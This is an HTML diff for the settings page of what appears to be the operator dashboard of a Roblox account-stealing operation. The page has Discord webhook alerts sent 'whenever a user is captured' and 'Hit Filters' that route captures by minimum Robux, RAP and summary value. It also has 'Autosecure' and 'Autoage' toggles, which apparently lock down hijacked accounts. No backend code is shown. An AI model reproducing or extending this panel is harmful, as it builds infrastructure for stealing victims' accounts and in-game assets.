+                    <div class="webhook-glass-top">
+                        <div class="webhook-icon-badge">
+                            <i class="fab fa-discord"></i>
+                        </div>
+                        <div class="webhook-meta">
+                            <div class="webhook-card-title">Discord Webhook</div>
+                            <div class="webhook-card-desc">Real-time alerts whenever a user is captured</div>
+                        </div>
+                        <div class="webhook-status-pill" id="settingsWebhookBadge">
+                            <span class="status-pulse-dot"></span>
+                            <span id="settingsWebhookBadgeText">Checking...</span>
+                        </div>
+                    </div>
+
+                    <div class="webhook-input-group">
+                        <label class="webhook-input-label" for="settingsWebhookUrl">
+                            <span><i class="fas fa-link"></i> Webhook URL</span>
+                            <span class="webhook-label-hint">discord.com/api/webhooks/...</span>
+                        </label>
+                        <div class="webhook-input-wrapper">
+                            <i class="fab fa-discord webhook-input-icon"></i>
+                            <input type="url" id="settingsWebhookUrl" class="webhook-glass-input" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" spellcheck="false">
+                            <button type="button" class="webhook-paste-btn" onclick="pasteWebhookUrl()" title="Paste from clipboard">
+                                <i class="fas fa-paste"></i>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="webhook-action-row">
+                        <button type="button" id="saveWebhookBtn" class="webhook-btn-white" onclick="saveSettingsWebhook()">
+                            <i class="fas fa-save"></i> Save Webhook
+                        </button>
+                        <button type="button" id="testWebhookBtn" class="webhook-btn-glass" onclick="testSettingsWebhook()">
+                            <i class="fas fa-paper-plane"></i> Test Webhook
+                        </button>
+                    </div>
+
+                    <div id="settingsWebhookMsg" class="webhook-glass-alert" style="display:none;"></div>
+
+                    <div class="webhook-guide-card">
+                        <i class="fas fa-info-circle webhook-guide-icon"></i>
+                        <div class="webhook-guide-text">
+                            In your Discord channel: go to <strong>Channel Settings &rarr; Integrations &rarr; Webhooks</strong>, create a new webhook, copy its URL, and paste it above.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="webhook-glass-card" style="margin-top:20px;">
+                    <div class="webhook-glass-top">
+                        <div class="webhook-icon-badge">
+                            <i class="fas fa-bullhorn"></i>
+                        </div>
+                        <div class="webhook-meta">
+                            <div class="webhook-card-title">Embed Options</div>
+                            <div class="webhook-card-desc">How capture notifications ping your server</div>
+                        </div>
+                    </div>
+                    <div class="bh-toggle-row">
+                        <label class="bh-toggle">
+                            <input type="checkbox" id="setEveryoneChk">
+                            <span class="bh-toggle-track"><span class="bh-toggle-thumb"></span></span>
+                            <span class="bh-toggle-label">@everyone</span>
+                        </label>
+                        <label class="bh-toggle">
+                            <input type="checkbox" id="setHereChk">
+                            <span class="bh-toggle-track"><span class="bh-toggle-thumb"></span></span>
+                            <span class="bh-toggle-label">@here</span>
+                        </label>
+                        <label class="bh-toggle">
+                            <input type="checkbox" id="setVisitNotiChk">
+                            <span class="bh-toggle-track"><span class="bh-toggle-thumb"></span></span>
+                            <span class="bh-toggle-label">Visit notifications</span>
+                        </label>
+                    </div>
+                    <div class="bh-toggle-row">
+                        <label class="bh-toggle">
+                            <input type="checkbox" id="setAnonymousChk">
+                            <span class="bh-toggle-track"><span class="bh-toggle-thumb"></span></span>
+                            <span class="bh-toggle-label">Anonymous mode</span>
+                        </label>
+                        <label class="bh-toggle">
+                            <input type="checkbox" id="setAutosecureChk">
+                            <span class="bh-toggle-track"><span class="bh-toggle-thumb"></span></span>
+                            <span class="bh-toggle-label">Autosecure</span>
+                        </label>
+                        <label class="bh-toggle">
+                            <input type="checkbox" id="setAutoageChk">
+                            <span class="bh-toggle-track"><span class="bh-toggle-thumb"></span></span>
+                            <span class="bh-toggle-label">Autoage</span>
+                        </label>
+                    </div>
+                </div>
+
+                <div class="webhook-glass-card" style="margin-top:20px;">
+                    <div class="webhook-glass-top">
+                        <div class="webhook-icon-badge">
+                            <i class="fas fa-filter"></i>
+                        </div>
+                        <div class="webhook-meta">
+                            <div class="webhook-card-title">Hit Filters</div>
+                            <div class="webhook-card-desc">Only notify when a capture meets the minimum value — optional separate webhook per filter</div>
+                        </div>
+                    </div>
+                    <div class="bh-form-grid">
+                        <div class="input-group">
+                            <label for="setRobuxFilter">Min Robux</label>
+                            <input type="number" id="setRobuxFilter" min="0" placeholder="999999">
+                        </div>
+                        <div class="input-group">
+                            <label for="setRobuxWebhook">Robux Webhook URL</label>
+                            <input type="text" id="setRobuxWebhook" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" spellcheck="false">
+                        </div>
+                        <div class="input-group">
+                            <label for="setSummaryFilter">Min Summary</label>
+                            <input type="number" id="setSummaryFilter" min="0" placeholder="999999">
+                        </div>
+                        <div class="input-group">
+                            <label for="setSummaryWebhook">Summary Webhook URL</label>
+                            <input type="text" id="setSummaryWebhook" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" spellcheck="false">
+                        </div>
+                        <div class="input-group">
+                            <label for="setRapFilter">Min RAP</label>
+                            <input type="number" id="setRapFilter" min="0" placeholder="999999">
+                        </div>
+                        <div class="input-group">
+                            <label for="setRapWebhook">RAP Webhook URL</label>
+                            <input type="text" id="setRapWebhook" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" spellcheck="false">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="webhook-glass-card" style="margin-top:20px;">
+                    <div class="webhook-glass-top">
+                        <div class="webhook-icon-badge">
+                            <i class="fas fa-key"></i>
+                        </div>
+                        <div class="webhook-meta">
+                            <div class="webhook-card-title">Recovery Token</div>
+                            <div class="webhook-card-desc">Used to recover dashboard access if you ever lose your session</div>
+                        </div>
+                    </div>
+                    <div class="bh-token-row">
+                        <code id="recoveryTokenVal" class="bh-token-code">…</code>
+                        <button type="button" class="webhook-btn-glass" onclick="copyRecoveryToken()">
+                            <i class="fas fa-copy"></i> Copy
+                        </button>
+                    </div>
+                </div>
+
+                <div class="webhook-action-row" style="margin-top:24px;">
+                    <button type="button" id="saveSettingsBtn" class="webhook-btn-white" onclick="saveAllSettings()">
+                        <i class="fas fa-save"></i> Save All Settings
+                    </button>
+                </div>
+                <div id="settingsMsg" class="webhook-glass-alert" style="display:none;"></div>
+            </div>
+        </section>
+    </main>
+
+    <div id="globalStatTooltip" class="stat-tooltip"></div>
+    </script>
+  </body>
+</html>
